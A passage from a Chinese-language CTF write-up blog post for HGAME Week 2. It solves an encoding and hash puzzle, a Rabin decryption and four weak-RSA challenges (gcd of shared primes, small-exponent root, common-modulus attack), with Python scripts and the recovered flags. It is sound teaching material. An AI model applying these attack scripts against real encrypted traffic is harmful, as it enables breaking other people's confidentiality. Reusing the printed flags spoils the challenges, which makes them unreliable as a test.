<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Part1, is seems like baseXX: QVl5Y3BNQjE1ektibnU3SnN6M0tGaQ==</span><br><span class="line">Part2, a hash function with 128bit digest size and 512bit block size: c629d83ff9804fb62202e90b0945a323</span><br><span class="line">Part3, a hash function with 160bit digest size and 512bit block size: 99f3b3ada2b4675c518ff23cbd9539da05e2f1f8</span><br><span class="line">Part4, the next generation hash function of part3 with 256bit block size and 64 rounds: 1838f8d5b547c012404e53a9d8c76c56399507a2b017058ec7f27428fda5e7db</span><br><span class="line">Ufwy5 nx 0gh0jf61i21h, stb uzy fqq ymj ufwyx ytljymjw, its&#x27;y ktwljy ymj ktwrfy.</span><br></pre></td></tr></table></figure>



<p>第一部分是base系列加密，用CyberChef点魔术棒解决：</p>
<p><img src="/static/HGAME-Week2/part1.png"></p>
<p>2、3、4部分是md5的爆破，采用网站<a target="_blank" rel="noopener" href="https://md5.cn/">md5在线加密解密</a>注册登录后查询（题目里这些值可以用这个免费查到）：</p>
<p>附上其他的网站（一些值需付费）</p>
<p><a target="_blank" rel="noopener" href="https://www.cmd5.org/">Cmd5 - MD5 Online ,MD5 Decryption, MD5 Hash Decoder</a></p>
<p><a target="_blank" rel="noopener" href="https://pmd5.com/">md5解密 MD5在线解密 破解md5 (pmd5.com)</a></p>
<p><a target="_blank" rel="noopener" href="http://ttmd5.com/hash.php">md5在线解密 在线加密 (ttmd5.com)</a></p>
<p>分别得到：f91c  4952  a3ed</p>
<p>最后那一串我们可以看到相同位置有个5存在，后面还有标点，猜测位一句加密过的话，位置不变的话想到凯撒密码。</p>
<p>采用<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">在线网站</a>，位移5位时成功得到明文：</p>
<p><img src="/static/HGAME-Week2/Part5.png"></p>
<p>Part5 is 0bc0ea61d21c, now put all the parts together, don’t forget the format.</p>
<p>至此5个部分全部得出，但组合时别忘记格式（uuid）</p>
<p>最终flag:<strong>hgame{f51d3a18-f91c-4952-a3ed-0bc0ea61d21c}</strong></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h3><p>题目即是考点，Rabin密码体制是对e=2的RSA的一种修正。</p>
<p>题目给出了p、q、c，足以解密。</p>
<p>解密脚本参考自<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv13467317">https://www.bilibili.com/read/cv13467317</a></p>
<p>脚本为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p=<span class="number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line">q=<span class="number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line">c=<span class="number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line">n=p*q</span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % n</span><br><span class="line">b = n - <span class="built_in">int</span>(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % n</span><br><span class="line">d = n - <span class="built_in">int</span>(c)</span><br><span class="line"><span class="comment">#因为rabin 加密有四种结果，全部列出。</span></span><br><span class="line">aa=[a,b,c,d]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(i)))</span><br></pre></td></tr></table></figure>

<p>得到flag:<strong>hgame{That‘5_s0_3asy_to_s@lve_r@bin}</strong></p>
<h3 id="RSA-大冒险1"><a href="#RSA-大冒险1" class="headerlink" title="RSA 大冒险1"></a>RSA 大冒险1</h3><p>4个不同有漏洞RSA加密组合题</p>
<p>远程连接一下就可以得到密文和公钥</p>
<p>具体的对应可以在相应的py文件中查看</p>
<p>challege1是用了三个素数，先除掉一个r后得到p*q(也就是n)</p>
<p>我得到的n是180326030445057103882510226931211081193929158820681452896727282807017</p>
<p>已经比较小了，用在线网站直接分解（所用网站：<a target="_blank" rel="noopener" href="https://zh.numberempire.com/numberfactorizer.php">分解素因数工具 - 整数分解最多为70位 </a>）</p>
<p><img src="/static/HGAME-Week2/pq.png"></p>
<p>写脚本decode1.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x240096b7f56bdbb9edf9af974c9c7644d03f2c7bc0571506e599fcc8c57e7c6232b347243fc133109e</span></span><br><span class="line">nn = <span class="number">178576184722741801717686323668363871157232668535871169547253050540473910756536548173809894332136913</span></span><br><span class="line">r = <span class="number">990296211157110473702991877289</span></span><br><span class="line">n = nn // r</span><br><span class="line">p = <span class="number">247562682664518807752664914940973974541</span></span><br><span class="line">q = <span class="number">728405543615082989281007689037</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>得到challenge1答案：<strong>m&lt;n_But_also_m&lt;p</strong></p>
<p>challenge2在代码中我们可以发现每次加密后只换了q，p、e一直都不变。明文显然也不变。</p>
<p>那我们只需要得到两组n，求这两个n的最大公约数即为p，再求q就行了。</p>
<p>解密脚本decode2.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n0 = <span class="number">152565543718334021801195699606763310261946146721086746925538472581261953855543959555565978627770092956075488682598513189685437191243276909534224625165367334434958301681355148478564729701659015537534219051767422647022148045778298186467940474529451231777930411879368015112385504736852930655214082742170869447319</span></span><br><span class="line">c0 = <span class="number">0xe1077c066b24d12acfe0f5ed1b25c00dd5631f749a75b7c7506eb62940f9c4a071212b55d0a437425dac118918cb35f0072c06dd5026367484149ffb1c932911d75ef7ba2601593835cf449f8308df272091b74a9d2ba60fb857398a7cf514e9057bb6694ded745cd07796280fc784f2e9299130e77696f2db08974821dcb9a</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">109324149518512467178297013889864800493756475061081985724435355574820721455422881440459243392018178539878746737345734346126513233606743972464410880410078757974920811270590189828415108760637521102456310383327284921212179797991186198361098556075603098884011777397062763979575141575851516468356489864995715380447</span></span><br><span class="line">c1 = <span class="number">0x9c3e9a67fa5c5a7cdd2513971ba7d7e6e9b7dc94b983bdc54bf565372b87375cfdcf4af0eeda5ff1854536240c4c138e2b4c47e06da5b836c15bfb00fba3f250a913a3b4a20bed162a8b0911b2be2966559680dbcfe24f473fd42f77fd37887417f95ef9ceb8f00a2c3ef6998b3aa32fedd29bafbc95f510d2ff5592ef6c56b1</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">0x2553bd52f014f6ee4d158fa519ff703f3a87859b3fb559a27451345c5e839bc0dc314ec1d2193e1f46bf2a418db8d8e8e384e553cc0b17ae582c20aac647542abb1df8645b87e2502ad0d0e213bb2d9a004bc9a2d8bf3d6cc5929562f329395985927e5be269e97a64c9d12e2b3dc455b3f39de004953eccea5aeb6c93e91c87</span></span><br><span class="line">p = gmpy2.gcd(n0, n1)</span><br><span class="line">q = n1 // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n1)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<p>得到challenge2答案：<strong>make_all_modulus_independent</strong></p>
<p>challenge3在代码中我们可以看见e = 3，指数e太小了，采用低加密指数攻击</p>
<p>这个脚本参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45859850/article/details/109785669">网站</a></p>
<p>decode3.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="comment">## -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">n = <span class="number">85922916993379152943776382336993370638235699872090311710227374583900564448437943846348707119156652095091626888243581784342821582968435766532371063770383345152966385664590187636565881294387850237371948868066550282339916385669215401537143798977103657518930000838792808631268504692069432085649850971399275060443</span></span><br><span class="line">c = <span class="number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+k*n,e)  <span class="comment">#c+k*n 开3次方根 能开3次方即可</span></span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>]))) <span class="comment">#转为字符串</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k=k+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到challenge3答案：<strong>encrypt_exponent_should_be_bigger</strong></p>
<p>challenge4代码中我们发现每次加密都只换了一个e，p、q、n均不变</p>
<p>考虑获得两组数据后共模攻击。</p>
<p>脚本参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46145027/article/details/125047313">网站</a>共模攻击部分</p>
<p>decode4.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">116243</span></span><br><span class="line">e2 = <span class="number">71741</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">83486225284114057111737329248786370210668434389571571580590922505571212527635260272602429749557465160260073470006815812186773107320652252605362829709397631964309031992737449999781228660587747329492657524701020372820606253551851826790867032314656784861211512735104950646283884949811606222485343066279965119119</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">0x1bf0437ad53b90a4d3a8d64cd09568f9fe29802586fa30995b7e45a264fa76f1c2058864cb47203e7db4740b9e39fee7e455562800d8bee8c7c0c3c4f2698258e2db8bc977092d1f09379350b5f1f13723cdd8c7f89dfe69cfa4d9106a624e1020bfd0946dfe26d136c6b4ae7bb3c7591a9ba2a332631dc86eaa8f18f170772</span></span><br><span class="line">c2 = <span class="number">0x2df2a7969f4470aa013390d01375d3ed661ea87ae7213718a22b82b38340f1a4aafe8cdb34bfff6dc1f35ff72c532d75bfc8d107a3f29c27cd725f5e91b596318d743e786d514dbb20b45bc02acf821711761dceef057decd714a81d712473304dc18426be48261122f94f4da3c2800923a4dab7991d3a3933b1bcbc470dbc07</span></span><br><span class="line"></span><br><span class="line">_, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>得到challenge4答案：<strong>never_uese_same_modulus</strong></p>
<p>最后在各个部分check，分数到达4后得到flag:</p>
<p><strong>hgame{W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA}</strong></p>
<p>第二周折磨结束了，三天喘喘。收获很多，学到新知识了。QAQ</p>
<p>路漫漫~</p>
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "https://rippleqaq.github.io/2023/02/24/HGAME-Week2/",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "https://rippleqaq.github.io/2023/02/24/HGAME-Week2/";
            const title         = "「HGAME 2022 Week2 writeup by ripple」";
            const excerpt       = `HGAME 2022 Week2 writeup by rippleREVERSEmath比较有意思的一道线性代数题（bushi
下载附件，放入IDA反汇编。
看到scanf，输入的变量我重命名了一下：

核心加密逻辑：

到这里一开...`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    
                </div>
                <div class="pull-date">
                    <time datetime="2023-08-02T05:05:11.180Z" itemprop="dateModified">最后编辑：2023-08-02</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" HGAME 2022 Week1 writeup by ripple" href="/2023/02/08/HGAME-Week1/">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" 双系统的安装，hello linux" href="/2023/02/26/hello_ubuntu/">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
</article>

        

            </section>

        

                
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/static/1.jpg" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                16
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                5
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                0
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
    <div class="photo-background"></div>
    <h4 class="widget-title no-after">
        <i class="fa fa-compass"></i>
        文章目录
        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
    </h4>
    <div class="textwidget">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HGAME-2022-Week2-writeup-by-ripple"><span class="toc-text">HGAME 2022 Week2 writeup by ripple</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-text">math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Git-Leakage"><span class="toc-text">Git Leakage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v2board"><span class="toc-text">v2board</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commodity"><span class="toc-text">Commodity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Designer"><span class="toc-text">Designer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master-Revenge"><span class="toc-text">Tetris Master Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master"><span class="toc-text">Tetris Master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-In-Pro-Max"><span class="toc-text">Sign In Pro Max</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rabin"><span class="toc-text">Rabin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-%E5%A4%A7%E5%86%92%E9%99%A91"><span class="toc-text">RSA 大冒险1</span></a></li></ol></li></ol></li></ol>
    </div>
</aside>
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/match/">match</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/flask/">flask</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">2</span></li></ul>
  </aside>


            
                
            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2023/09/21/blog_demain_deploy/"><i class="fa  fa-book"></i> 为博客设置个人域名</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/04/04/flask_variable/"><i class="fa  fa-book"></i> flask路由与视图映射与传参规则</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/03/11/HGAME-Final/"><i class="fa  fa-book"></i> HGAME 2022 FINAL writeup by ripple</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/03/09/build_environment/"><i class="fa  fa-book"></i> linux内基本环境搭建</a>
            
          
        
          
          
            <a class="list-group-item" href="/2023/02/26/hello_ubuntu/"><i class="fa  fa-book"></i> 双系统的安装，hello linux</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>
        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://t.me/CandyUnion"><i class="fa fa-telegram"></i></a></li>
                        
                        
                        
                        <li><a target="_blank" rel="me" href="https://nya.one/@rippleQAQ"><i class="fa fa fa-share-alt-square"></i></a></li>
                        <li><a target="_blank" rel="nofollow" href="https://github.com/rippleQAQ"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2023 ripple 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by rippleQAQ.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>

        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="3204190542"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>



<!-- Extra support for third-party plguins  -->


    </body>
</html>